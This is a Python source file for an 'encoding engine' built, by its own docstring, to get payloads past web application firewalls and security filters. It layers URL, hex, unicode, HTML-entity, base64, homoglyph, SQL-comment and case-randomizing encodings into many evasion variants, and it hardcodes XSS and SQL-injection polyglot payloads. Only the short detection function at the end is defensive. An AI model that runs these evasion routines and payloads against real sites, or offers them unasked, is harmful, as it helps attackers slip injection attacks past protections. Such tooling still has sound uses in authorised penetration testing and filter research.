"""Encoding and obfuscation engine — bypass WAFs and security filters."""

from __future__ import annotations

import base64
import html
import random
import re
import urllib.parse


class EncodingEngine:
    """Multi-layer encoding/obfuscation for payload delivery."""

    # ── Single-layer encoders ──────────────────────────────────────────

    @staticmethod
    def url_encode(payload: str, encode_all: bool = False) -> str:
        if encode_all:
            return "".join(f"%{ord(c):02X}" for c in payload)
        return urllib.parse.quote(payload, safe="")

    @staticmethod
    def double_url_encode(payload: str) -> str:
        first = urllib.parse.quote(payload, safe="")
        return urllib.parse.quote(first, safe="")

    @staticmethod
    def unicode_encode(payload: str) -> str:
        return "".join(f"\\u{ord(c):04x}" for c in payload)

    @staticmethod
    def hex_encode(payload: str) -> str:
        return "".join(f"\\x{ord(c):02x}" for c in payload)

    @staticmethod
    def html_entity_encode(payload: str, numeric: bool = False) -> str:
        if numeric:
            return "".join(f"&#{ord(c)};" for c in payload)
        return html.escape(payload)

    @staticmethod
    def html_hex_encode(payload: str) -> str:
        return "".join(f"&#x{ord(c):x};" for c in payload)

    @staticmethod
    def base64_encode(payload: str) -> str:
        return base64.b64encode(payload.encode()).decode()

    @staticmethod
    def rot13(payload: str) -> str:
        result = []
        for c in payload:
            if "a" <= c <= "z":
                result.append(chr((ord(c) - ord("a") + 13) % 26 + ord("a")))
            elif "A" <= c <= "Z":
                result.append(chr((ord(c) - ord("A") + 13) % 26 + ord("A")))
            else:
                result.append(c)
        return "".join(result)

    @staticmethod
    def unicode_normalization_bypass(payload: str) -> str:
        """Use Unicode equivalent characters to bypass filters."""
        mapping = {
            "<": "\uFF1C",  # fullwidth <
            ">": "\uFF1E",  # fullwidth >
            "'": "\u2019",  # right single quote
            '"': "\u201D",  # right double quote
            "/": "\u2215",  # division slash
            "\\": "\uFF3C",  # fullwidth backslash
            "(": "\uFF08",  # fullwidth (
            ")": "\uFF09",  # fullwidth )
            " ": "\u00A0",  # non-breaking space
        }
        return "".join(mapping.get(c, c) for c in payload)

    @staticmethod
    def sql_comment_bypass(payload: str) -> str:
        """Insert SQL comments to break keyword detection."""
        keywords = ["SELECT", "UNION", "INSERT", "UPDATE", "DELETE", "DROP",
                     "FROM", "WHERE", "AND", "OR", "ORDER", "GROUP"]
        result = payload
        for kw in keywords:
            pattern = re.compile(re.escape(kw), re.IGNORECASE)
            if pattern.search(result):
                mid = len(kw) // 2
                replacement = kw[:mid] + "/**/" + kw[mid:]
                result = pattern.sub(replacement, result, count=1)
        return result

    @staticmethod
    def case_randomize(payload: str) -> str:
        return "".join(
            c.upper() if random.random() > 0.5 else c.lower()
            if c.isalpha() else c
            for c in payload
        )

    @staticmethod
    def chunk_transfer_encode(payload: str) -> str:
        """Simulate chunked transfer encoding split."""
        chunks = []
        i = 0
        while i < len(payload):
            size = random.randint(1, min(4, len(payload) - i))
            chunk = payload[i:i + size]
            chunks.append(f"{size:x}\r\n{chunk}\r\n")
            i += size
        chunks.append("0\r\n\r\n")
        return "".join(chunks)

    # ── Multi-layer / polyglot ─────────────────────────────────────────

    def polyglot_encode(self, payload: str, layers: int = 2) -> list[str]:
        """Generate multiple encoding variants that bypass different filter types."""
        variants: list[str] = [payload]

        encoders = [
            ("url", self.url_encode),
            ("double_url", self.double_url_encode),
            ("unicode", self.unicode_encode),
            ("hex", self.hex_encode),
            ("html_entity", lambda p: self.html_entity_encode(p, numeric=True)),
            ("html_hex", self.html_hex_encode),
            ("base64", self.base64_encode),
            ("unicode_norm", self.unicode_normalization_bypass),
            ("case_rand", self.case_randomize),
            ("sql_comment", self.sql_comment_bypass),
        ]

        # Single-layer variants
        for name, fn in encoders:
            try:
                encoded = fn(payload)
                if encoded != payload and encoded not in variants:
                    variants.append(encoded)
            except Exception:
                continue

        # Multi-layer variants (combine encoders)
        if layers >= 2:
            for i, (n1, fn1) in enumerate(encoders):
                for j, (n2, fn2) in enumerate(encoders):
                    if i == j:
                        continue
                    try:
                        multi = fn2(fn1(payload))
                        if multi not in variants:
                            variants.append(multi)
                    except Exception:
                        continue
                    if len(variants) >= 30:
                        break
                if len(variants) >= 30:
                    break

        return variants

    def generate_polyglot_payloads(self, attack_type: str) -> list[str]:
        """Generate polyglot payloads that target multiple vulnerability classes."""
        polyglots = {
            "xss_sqli": [
                "'\"><img src=x onerror=alert(1)>",
                "1' OR '1'='1'--><script>alert(1)</script>",
                "{{7*7}}<script>alert(1)</script>' OR 1=1--",
            ],
            "universal": [
                "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik/%0telerik%0d%0a//*/</stYle/</titLe/</telerik/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
                "'\"-->]]>*/</script></style></title></textarea><script>alert(1)</script>",
                "{{constructor.constructor('return this')()}}<img src=x onerror=alert(1)>' OR 1=1--",
            ],
        }

        results: list[str] = []
        for key, payloads in polyglots.items():
            results.extend(payloads)

        # Encode each with multiple strategies
        encoded_results: list[str] = list(results)
        for p in results[:5]:
            encoded_results.extend(self.polyglot_encode(p, layers=1)[:3])

        return list(dict.fromkeys(encoded_results))  # deduplicate, preserve order


# ── Encoding detection ─────────────────────────────────────────────────

def detect_encoding(payload: str) -> list[str]:
    """Detect which encoding layers have been applied to a payload."""
    detected: list[str] = []

    if re.search(r"%[0-9A-Fa-f]{2}", payload):
        detected.append("url_encoded")
    if re.search(r"%25[0-9A-Fa-f]{2}", payload):
        detected.append("double_url_encoded")
    if re.search(r"\\u[0-9A-Fa-f]{4}", payload):
        detected.append("unicode_escaped")
    if re.search(r"\\x[0-9A-Fa-f]{2}", payload):
        detected.append("hex_escaped")
    if re.search(r"&#\d+;", payload):
        detected.append("html_numeric_entity")
    if re.search(r"&#x[0-9a-fA-F]+;", payload):
        detected.append("html_hex_entity")
    if re.search(r"^[A-Za-z0-9+/]+=*$", payload) and len(payload) > 10:
        try:
            base64.b64decode(payload)
            detected.append("base64")
        except Exception:
            pass

    return detected
